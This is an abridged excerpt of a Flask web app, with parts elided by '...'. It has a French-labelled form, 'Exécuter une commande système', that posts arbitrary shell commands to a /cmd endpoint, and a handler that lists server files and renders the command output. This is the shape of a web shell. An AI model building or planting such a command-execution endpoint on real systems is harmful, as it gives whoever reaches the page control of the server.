...
<head>
    ...
    <style>
        ...
        input, textarea, button { width: 100%; background: #222; color: #0f0; border: 1px solid #0f0; padding: 5px; margin-top: 5px; }
        pre { background: #222; padding: 10px; overflow-x: auto; }
        .cmd-output { border: 1px dashed #0f0; padding: 10px; margin-top: 10px; }
    </style>
</head>
<body>
    ...
    <h3>Exécuter une commande système</h3>
    <form method="POST" action="/cmd">
        <input name="cmd" placeholder="ex: ls -la">
...
def cmd():
    ...
    # Réafficher l'interface avec le résultat de la commande
    path = BASE_DIR
    parent = None
    items = []
    for name in sorted(os.listdir(path)):
    ...
    return render_template_string(HTML, path=path, files=items, parent=parent, output=output)
